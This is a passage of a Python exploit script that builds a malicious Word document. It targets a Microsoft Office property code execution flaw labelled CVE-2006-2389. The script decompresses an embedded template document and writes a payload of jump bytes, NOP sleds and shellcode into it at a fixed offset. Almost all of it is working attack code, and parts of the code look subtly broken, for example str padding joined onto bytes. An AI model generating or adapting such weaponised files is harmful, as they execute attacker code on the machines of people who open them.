b"\x54\xCB\x36\xD5\x78\xEB\x49\x3C\x85\xA7\xA1\xFE\xA7\x88\xBA\x2F\xF4\x2C\x54\x8B\xAA\xE7\xB0\x02\xCF\x5B\xF3\xF1"
b"\x82\x98\xF7\x8B\x5E\xC4\x2A\xBC\x24\x66\x7B\x93\x97\xAD\xE1\xAF\x88\x79\x1F\xE9\x55\xAC\xC3\x6B\x78\x1D\x6F\x58"
b"\xC3\x7F\xB1\xBC\x65\xE5\x3D\x2E\xF5\xD4\xCB\x68\x3C\x97\xCB\xBE\x78\x1D\xDB\x55\x2E\xDB\x92\xDA\x62\x82\x4F\xEA"
b"\xDF\xFE\x78\xC6\xA5\xEA\x90\xB0\x08\xF3\x5E\xE2\x26\x73\x70\x27\xEF\xF7\x1E\xC8\xDA\xDC\x43\xB5\x71\x79\xDB\xDA"
b"\xF6\x54\xBA\x9A\xBD\x66\x18\x7B\x80\xD9\x4C\xAF\xE4\x29\xC6\x68\xE4\x58\x94\x82\xF9\xCC\x1C\xBC\xDB\xC1\x7C\xDD"
b"\x9F\xA5\x9F\xC0\x9E\xD7\x91\xEE\x2D\xEC\x3D\xAA\xE9\xE3\x38\xC9\x3D\xEB\xE7\xBD\x53\xBC\x38\x1D\xAA\xCE\x2C\xC9"
b"\xF4\x55\xAA\x15\x63\xDE\x55\x0C\xA5\xE6\x50\x53\x55\x8D\x17\xD5\xBA\xBF\x9E\xA9\x8F\x32\xE6\x49\xF5\xC9\x65\xFF"
b"\xCF\x31\xF6\x77\xBB\x54\x9F\xE9\xAB\x35\xEE\xB2\xE6\x21\x98\x69\x1B\xFF\xAA\xC9\x6A\x7B\x18\x5A\x6C\xC9\x4B\x36"
b"\x3F\xCD\x99\x7E\x49\xD7\xFF\x1A\xAF\xE9\x3B\x8C\x26\x97\x63\xA9\xCB\x7A\xB0\x15\x64\x05\xF3\x71\x9F\x54\x81\xE9"
b"\xAB\x35\xA9\x8E\x59\x25\x59\xFF\x9E\x29\x99\x53\x1D\xC9\x1A\xC8\xA5\x3E\xCF\xB1\x9A\xAB\x06\x9F\xAA\xB0\x04\xE7"
b"\x5A\x7E\xCF\x76\xEF\xE9\x96\x68\x02\x41\xA4\x92\xAE\x7F\xEF\xA4\x66\x46\xD7\x83\x97\x6E\x72\x50\xFA\x21\x91\xE6"
b"\x36\xE4\x5F\x77\xAB\xF3\xB7\x8E\x39\xB7\x4C\x1A\x3B\x72\x5C\x6E\x82\x6F\x83\x46\xE3\x9C\xB0\x5B\x6F\xF5\x92\x77"
b"\x18\x3B\xB3\x7A\xDD\xC8\xF3\xF6\x46\xCD\xE5\x78\x8B\x35\xB7\x95\xD6\x16\xAE\xD3\x6F\x95\xFE\x1F\x2A\x33\x0C\x59"
)

print ("[+] Microsoft Office Property Code Execution exploit (CVE-2006-2389)")
if len(sys.argv) != 2:
	print ("[+] Usage: "+ sys.argv[0] + " file.doc")
	exit(0)
	
	
evilbuff = bytearray(zlib.decompress(compressedfile))


payload  = b"\xE1\xE2\xE2\xE3"
payload += b"\xEB\x15\xFC\xFC"
payload += "\x90" * 20
payload	+= shellcode
payload += "\x90" * (704-len(shellcode))

offset = 0x16730


for i in range(0,len(payload)):
	evilbuff[offset + i] = payload[i]

	
file = sys.argv[1]
f = open(file,mode='wb')
f.write(evilbuff)
print ("[+] Done")
